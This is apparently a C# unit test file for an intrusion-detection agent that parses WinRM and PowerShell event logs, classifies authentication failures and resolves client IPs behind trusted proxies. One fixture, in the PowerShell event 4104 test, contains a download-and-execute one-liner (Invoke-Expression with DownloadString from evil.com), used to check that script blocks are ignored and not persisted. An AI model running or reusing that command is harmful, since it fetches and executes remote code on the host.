namespace IDDSCommunity.Agents.WinRm.Test;

using System;
using System.Collections.Generic;
using System.Net;
using IDDSCommunity.Agents.Authentication.Common;
using IDDSCommunity.Agents.WinRm;
using IDDSCommunity.IntrusionDetection.Api.Plugin;
using IDDSCommunity.IntrusionDetection.Shared;
using IDDSCommunity.IntrusionDetection.Shared.Correlation;
using IDDSCommunity.IntrusionDetection.Shared.Network;
using Microsoft.VisualStudio.TestTools.UnitTesting;

/// <summary>
/// 驗證 Windows Remote Management (WinRM / WAC) 事件剖析、受信任反向代理與安全代理完整功能矩陣。
/// </summary>
[TestClass]
public class WinRmEventParserTest
{
    /// <summary>
    /// 驗證具 Windows Event XML 命名空間的固定事件可擷取具名欄位與活動識別碼。
    /// </summary>
    [TestMethod]
    public void ReadXml_NamespacedFixture_ExtractsNamedFieldsAndCorrelation()
    {
        const string xml = """
            <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
              <System><Correlation ActivityID="{11111111-2222-3333-4444-555555555555}" /></System>
              <EventData>
                <Data Name="userName">fixture-user</Data>
                <Data Name="clientIP">198.51.100.41</Data>
                <Data Name="errorCode">0x80338012</Data>
              </EventData>
            </Event>
            """;

        IReadOnlyDictionary<string, string> fields = WinRmEventParser.ReadNamedAndPositionalFields(xml);
        AuthenticationFailureEvent? failure = WinRmEventParser.TryParseFields(
            fields, DateTimeOffset.UtcNow, 161, "Microsoft-Windows-WinRM/Operational");

        Assert.IsNotNull(failure);
        Assert.AreEqual("fixture-user", failure.AccountName);
        Assert.AreEqual("{11111111-2222-3333-4444-555555555555}", failure.ActivityId);
    }

    /// <summary>
    /// 驗證相同事件識別碼出現在未知通道時安全降級，不會被誤判為 WinRM 密碼失敗。
    /// </summary>
    [TestMethod]
    public void Parse_UnknownChannelWithKnownEventId_ReturnsNull()
    {
        Dictionary<string, string> fields = new(StringComparer.OrdinalIgnoreCase)
        {
            ["userName"] = "fixture-user",
            ["clientIP"] = "198.51.100.41",
            ["errorCode"] = "0x80338012"
        };

        Assert.IsNull(WinRmEventParser.TryParseFields(fields, DateTimeOffset.UtcNow, 161, "Unknown/Operational"));
    }

    /// <summary>
    /// 驗證 WinRM Operational 頻道事件 161 (認證失敗 / 0x80338012) 標示為明確憑證失敗 (IsCredentialFailure=true)。
    /// </summary>
    [TestMethod]
    public void Parse_Operational_Event161_AuthFailed_IsCredentialFailure()
    {
        Dictionary<string, string> fields = new(StringComparer.OrdinalIgnoreCase)
        {
            ["userName"] = "admin_psremoting",
            ["clientIP"] = "198.51.100.25",
            ["errorCode"] = "0x80338012",
            ["ActivityId"] = "{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}"
        };

        DateTimeOffset now = DateTimeOffset.UtcNow;
        AuthenticationFailureEvent? failure = WinRmEventParser.TryParseFields(fields, now, 161, "Microsoft-Windows-WinRM/Operational");

        Assert.IsNotNull(failure);
        Assert.AreEqual(IPAddress.Parse("198.51.100.25"), failure.SourceAddress);
        Assert.AreEqual("admin_psremoting", failure.AccountName);
        Assert.AreEqual(161, failure.EventId);
        Assert.IsTrue(failure.IsCredentialFailure, "Event 161 應為明確憑證驗證失敗");
        Assert.AreEqual("{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}", failure.ActivityId);
        Assert.AreEqual(1.0, failure.ConfidenceScore);
    }

    /// <summary>
    /// 驗證 WinRM Operational 頻道事件 142 (存取拒絕 / 0x80070005) 標記為非密碼驗證失敗 (IsCredentialFailure=false)。
    /// </summary>
    [TestMethod]
    public void Parse_Operational_Event142_AccessDenied_IsNonCredentialFailure()
    {
        Dictionary<string, string> fields = new(StringComparer.OrdinalIgnoreCase)
        {
            ["userName"] = "RemoteAdmin",
            ["clientIP"] = "192.0.2.10",
            ["errorCode"] = "0x80070005"
        };

        DateTimeOffset now = DateTimeOffset.UtcNow;
        AuthenticationFailureEvent? failure = WinRmEventParser.TryParseFields(fields, now, 142, "Microsoft-Windows-WinRM/Operational");

        Assert.IsNotNull(failure);
        Assert.AreEqual(IPAddress.Parse("192.0.2.10"), failure.SourceAddress);
        Assert.IsFalse(failure.IsCredentialFailure, "0x80070005 存取被拒為授權原則問題，不應算密碼錯誤");
    }

    /// <summary>
    /// 驗證大量 WinRM 142 存取被拒事件送入關聯引擎時，永不產生密碼噴灑告警 (Negative Test)。
    /// </summary>
    [TestMethod]
    public void Parse_Operational_StreamOf142_NeverTriggersSprayAlert()
    {
        CrossAgentCorrelationEngine engine = new(TimeSpan.FromMinutes(10));
        DateTimeOffset now = DateTimeOffset.UtcNow;

        for (int i = 0; i < 10; i++)
        {
            Dictionary<string, string> fields = new(StringComparer.OrdinalIgnoreCase)
            {
                ["userName"] = $"TargetUser_{i}",
                ["clientIP"] = "198.51.100.30",
                ["errorCode"] = "0x80070005"
            };

            AuthenticationFailureEvent? failure = WinRmEventParser.TryParseFields(fields, now.AddSeconds(i), 142, "Microsoft-Windows-WinRM/Operational");
            Assert.IsNotNull(failure);
            Assert.IsFalse(failure.IsCredentialFailure);

            SecurityObservationEvent obs = new()
            {
                SourceAgentName = "WinRmSecurityAgent",
                ProviderOrChannel = "Microsoft-Windows-WinRM/Operational",
                NormalizedIpAddress = failure.SourceAddress.ToString(),
                NormalizedAccount = failure.AccountName,
                EventTimeUtc = failure.OccurredAt,
                IsCredentialFailure = failure.IsCredentialFailure
            };

            CorrelationEvaluationResult result = engine.Evaluate(obs);
            Assert.AreEqual(CorrelationAction.None, result.Action, "存取拒絕事件永不可觸發密碼噴灑告警");
        }
    }

    /// <summary>
    /// 驗證 Security 4625 於網路登入且 ProcessName 為 '-' 時，不被 WinRM Agent 硬篩（由通用登入 Agent 處理）。
    /// </summary>
    [TestMethod]
    public void Parse_Security_Event4625_WhenProcessNameIsDash_NotHardcodedAsWinRm()
    {
        Dictionary<string, string> fields = new(StringComparer.OrdinalIgnoreCase)
        {
            ["LogonType"] = "3",
            ["ProcessName"] = "-",
            ["Status"] = "0xC000006D",
            ["SubStatus"] = "0xC000006A",
            ["IpAddress"] = "192.0.2.77",
            ["TargetUserName"] = "TestUser"
        };

        AuthenticationFailureEvent? failure = WinRmEventParser.TryParseFields(fields, DateTimeOffset.UtcNow, 4625, "Security");
        Assert.IsNull(failure);
    }

    /// <summary>
    /// 驗證 PowerShell 腳本區塊事件 (4104) 被明確過濾，絕不解析為來源 IP 且不持久化指令。
    /// </summary>
    [TestMethod]
    public void Parse_PowerShell_Event4104_SensitiveScriptBlock_IgnoredAndNeverPersisted()
    {
        Dictionary<string, string> fields = new(StringComparer.OrdinalIgnoreCase)
        {
            ["ScriptBlockText"] = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
            ["clientIP"] = "198.51.100.99"
        };

        AuthenticationFailureEvent? failure = WinRmEventParser.TryParseFields(fields, DateTimeOffset.UtcNow, 4104, "Microsoft-Windows-PowerShell/Operational");
        Assert.IsNull(failure);
    }

    /// <summary>
    /// 驗證直接連線來源不受信任時，嚴格忽略所有轉發標頭，強制使用 Direct Peer IP。
    /// </summary>
    [TestMethod]
    public void ResolveClientIp_DirectPeerUntrusted_IgnoresXffAndForwarded()
    {
        IPAddress peer = IPAddress.Parse("198.51.100.8");
        string[] trusted = ["10.0.0.0/8"];

        IPAddress resolved = TrustedProxyParser.ResolveClientIp(peer, "for=1.2.3.4", "1.2.3.4", trusted);
        Assert.AreEqual(peer, resolved);
    }

    /// <summary>
    /// 驗證多層受信任代理鏈結自右向左逐層剝除，取得首個非受信任端點。
    /// </summary>
    [TestMethod]
    public void ResolveClientIp_DirectPeerTrusted_MultiHop_RightToLeftPeeling()
    {
        IPAddress peer = IPAddress.Parse("10.0.0.2");
        string[] trusted = ["10.0.0.0/8", "172.16.0.0/12"];
        string xff = "198.51.100.99, 172.16.1.1, 10.0.0.1";

        IPAddress resolved = TrustedProxyParser.ResolveClientIp(peer, null, xff, trusted);
        Assert.AreEqual(IPAddress.Parse("198.51.100.99"), resolved);
    }

    /// <summary>
    /// 驗證 Agent 不執行本機重複門檻，直接將觀察事件輸出給中央管線。
    /// </summary>
    [TestMethod]
    public void Agent_DisablesLocalThresholdDetector_EmitsEveryObservationDirectly()
    {
        TestAuthenticationEventSource source = new();
        WinRmSecurityAgent agent = new(source);

        try
        {
            int emittedCount = 0;
            AuthenticationNotificationEventArgs? captured = null;
            agent.AttackDetected += (sender, args) =>
            {
                emittedCount++;
                captured = args as AuthenticationNotificationEventArgs;
            };

            agent.Start();

            DateTimeOffset now = DateTimeOffset.UtcNow;
            source.Emit(new AuthenticationFailureEvent(
                now,
                IPAddress.Parse("198.51.100.50"),
                161,
                "WinRM",
                "user1",
                "Failed",
                ActivityId: "activity-1",
                ProviderOrChannel: "Microsoft-Windows-WinRM/Operational",
                ComputerName: "SERVER01",
                SourceEventRecordId: 9001));
            Assert.AreEqual(1, emittedCount, "每筆事件應直接輸出至中央管線");
            Assert.IsNotNull(captured);
            Assert.AreEqual("user1", captured.AccountName);
            Assert.AreEqual("activity-1", captured.ActivityId);
            Assert.AreEqual(9001L, captured.SourceEventRecordId);
            Assert.AreEqual("SERVER01", captured.ComputerName);

            source.Emit(new AuthenticationFailureEvent(now.AddSeconds(2), IPAddress.Parse("198.51.100.50"), 161, "WinRM", "user1", "Failed"));
            Assert.AreEqual(2, emittedCount, "每筆事件只計算一次，無本機重複計數");
        }
        finally
        {
            agent.Stop();
        }
    }

    private sealed class TestAuthenticationEventSource : IAuthenticationEventSource
    {
        public event EventHandler<AuthenticationFailureEvent>? EventReceived;
        public event Action<Exception>? Error;

        public void Emit(AuthenticationFailureEvent failure) => EventReceived?.Invoke(this, failure);
        public void EmitError(Exception ex) => Error?.Invoke(ex);

        public void Start() { }
        public void Pause() { }
        public void Resume() { }
        public void Stop() { }
        public void Dispose() { }
    }
}
